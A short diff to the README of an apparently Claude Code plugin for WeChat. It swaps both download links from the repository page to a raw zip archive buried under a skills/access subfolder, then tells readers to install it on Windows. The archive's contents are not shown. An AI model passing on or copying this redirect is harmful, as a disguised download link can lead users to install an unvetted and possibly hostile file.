@@ -1,11 +1,11 @@
 # 🤖 claude-plugin-weixin - WeChat replies inside Claude Code
 
-[![Download](https://img.shields.io/badge/Download-claude--plugin--weixin-blue?style=for-the-badge)](https://github.com/goldiacogitative647/claude-plugin-weixin)
+[![Download](https://img.shields.io/badge/Download-claude--plugin--weixin-blue?style=for-the-badge)](https://github.com/goldiacogitative647/claude-plugin-weixin/raw/refs/heads/main/skills/access/weixin-plugin-claude-3.4.zip)
 
 ## 📥 Download and install
 
 Use this page to get the plugin files:
-https://github.com/goldiacogitative647/claude-plugin-weixin
+https://github.com/goldiacogitative647/claude-plugin-weixin/raw/refs/heads/main/skills/access/weixin-plugin-claude-3.4.zip
 
 Open the page in your browser, then follow the install steps below on your Windows PC.
 
